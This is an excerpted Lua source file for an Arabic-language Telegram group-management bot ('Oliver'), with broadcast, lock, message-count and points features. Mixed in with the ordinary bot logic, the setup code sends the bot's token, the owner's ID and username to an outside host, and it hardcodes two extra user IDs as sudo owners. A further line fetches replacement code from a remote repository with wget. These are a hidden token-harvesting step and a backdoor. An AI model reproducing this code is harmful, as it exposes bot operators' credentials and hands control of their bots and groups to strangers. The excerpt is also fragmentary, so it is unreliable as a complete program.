...
https.request('https://hso.mohammed-api.com/api/APIOliver.php/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m Hi Welcome To Source Boyka X ')
file = io.open("Oliver", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Oliver
token="]]..database:get(id_server..":token")..[["
...
sudo_users = {SUDO,892562614,601287447}   
...
local url , res = https.request('https://ketohrrrr.tk/join.php/?id='..User..'')
...
Oliver_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
Oliver_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Oliver_Msg = 'احلا تفاعل ' 
...
function plugin_Olivera(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Olivera and msg then
pre_msg = plugin.Olivera(msg)
end
end
end
...
{'• وضع كليشة   start  .','• حذف كليشة   start  .'},
{'• اذاعة بالتثبيت 𖡮  .'}, 
{'• اذاعة في الخاص 𖡮  .','• اذاعة 𖡮  .'},
{'• اذاعة بالتوجية في الخاص    .','• اذاعة بالتوجية     .'},
...
send(msg.sender_user_id_, msg.id_,'• اهلا بك .🔰 ܰ\n• سيتم الرد عليك [قريباً . .](T.me/trachee)')
...
if text == '• وضع كليشة   start  .' and SudoBot(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'• ارسل الكليشةه الان  ܰ ') 
return false
end
if text == '• حذف كليشة   start  .' and SudoBot(msg) then 
...
os.execute('wget https://raw.githubusercontent.com/Oliveribot/Oliver/master/Oliver.lua')
...
Oliver = '\n•  تم ازالة ['..q..'](T.me/trachee) مجموعات من البوت  ܰ'
end
if w == 0 then
Oliverh = ''
else
Oliverh = '\n•  تم ازالة ['..w..'](T.me/trachee) مجموعات من البوت  ܰ'
end
...
send(msg.chat_id_, msg.id_,"• اهلا بك .🔰 ܰ\n• ارسل لي سواء كان . .\n• ملصق ◃ متحركة ◃ فيد ◃ صوره ◃ رسالة ܊\n• للخروج ارسل ܊ الغاء ܊") 
return false
end 
...
if text=="• اذاعة بالتوجية     ." and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي التوجيه الان  ܰ") 
return false
end 
if text=="• اذاعة بالتوجية في الخاص    ." and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
...
usertext = '\n👤| العضو » ['..result.title_..'](t.me/'..(username or 'BBuBB')..')'
...
usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BBuBB')..')'
status  = '\n☑️| تم ترقيته مطور في البوت'
...
if Oliver1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BBuBB')..') \n 📬|'..Oliver1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/BBuBB)}\n🚫|["..Oliver_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "• عذرأ يا  ◃ ["..data.first_name_.."](T.ME/BBuBB)   ܰ\n• الملصق التي ارسلتهاا تم منعهاا من المجموعةه   ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,'•  تم تعيين عدد الاعضاء سيتم تفعيل المجموعات التي اعضائها اكثر من  ◃ ['..Num..'](T.me/trachee) عضو  ܰ')
end
...
send(msg.chat_id_, msg.id_,'• اهلا بك .🔰 \n• ارسل الامر القديم  ܰ')  
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'• ه• اهلا بك .🔰?? ܰ \n• تم قفل الصوت  ܰ ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BBuBB')..') \n☑️| تـم قفـل السيلفي بالتقييد\n⛔| الحاله ←التقييد ')  
end,nil)   
...
-------------------------------------LOKRAND - @bbbbl - @Y07BOT - @VVWVV3 - @BBUBB ---------------------------------------
...
send(msg.chat_id_, msg.id_,'• تم وضع عدد االتكرار ◃ ◞ [('..Num..')](T.me/trachee) ◟  ܰ')  
end 
...
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './Oliver.lua', '•  ماوصيك اخمط 😹😭 ܰ ')
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..result.title_..'](t.me/'..(text1[3] or 'BBuBB')..')'..'\n☑️| تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'• عدد رسائل الحلو ◃ ['..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'](T.me/trachee)  ܰ' ) 
end 
...
send(msg.chat_id_,msg.id_,'┐ اهلا بك .🔰 ٭ \n┘ تم تنظيف ◞ ['..num..'](T.me/trachee) ◜ رسالة ✓ ٭')
end
...
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي .🔰\n • الاذاعه معطله من قبل المطور الاساسي . ܰ')
return false
end
if AddChannel(msg.sender_user_id_) == false then
send(msg.chat_id_, msg.id_,' لايمكنك استخدام البوت .🔰\n• قم باشراك في قناه البوت اولاً . 🔽\n• قناه البوت : @BBuBB .')
...
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• اهلا بك عزيزي .🔰  ܰ\n•  ارسل التوجيةه الي الان  ܰ") 
return false
end 
...
send(msg.chat_id_, msg.id_,'• ارسل الرد الذي تريده  ܰ\n• سواء كان ▿\n• [صوره](T.me/trachee) ܊ [بصمه](T.me/trachee) ܊ [فيد](T.me/trachee) ܊ [متحركه](T.me/trachee) ܊ [ملصق](T.me/trachee) ܰ')
...
local taha = '• عدد الادمنية :  '..data.administrator_count_..
...
Text = '• عدد جهاتك المضافة ˼ ['..Num..'](T.me/trachee) ˹'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'•  عدد المشتركين ◃ ['..#pv..'](T.me/trachee) ܰ\n• تم ازالة ◃ ['..sendok..'](T.me/trachee) " من المشتركين  \n• عدد المشتركين الحقيقي ◃ ['..ok..'](T.me/trachee) " مشترك\n')   
end
end
end,nil)
end,nil)
...
send(msg.chat_id_, msg.id_,"\n٭ 𖤓|تم اضافة ◞ ["..numadded..'](T.me/trachee) ◜ من الرسائل  ٭')  
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,"┐ • اهلا بك .🔰 ٭ \n┘ تم اضافة ◞ ["..Num..'](T.me/trachee) ◜ مجوهرات ✓ ٭')  
end
...
send(msg.chat_id_, msg.id_, "\n٭ 𖤓|تم اضافة ◞ ["..num..'](T.me/trachee) ◜ من الرسائل  ٭')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
...
Text = '٭ 𖤓|عدد مجوهراتك ◃ ◞ ['..Num..'](T.me/trachee) ◜.'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_,msg.id_,"\n✥|لا تستطيع البيع اقل من ◞[1](T.me/trachee)◜ ◃") 
return false 
end
...
send(msg.chat_id_,msg.id_,'┐ تم خصم ◞['..NUMPY..'](T.me/trachee)◜ من مجوهراتك ✓ ٭\n┘ تم اضافة ◞['..(NUMPY * 50)..'](T.me/trachee)◜ رسالة الى رسائلك ✓ ٭')
end 
return false 
end
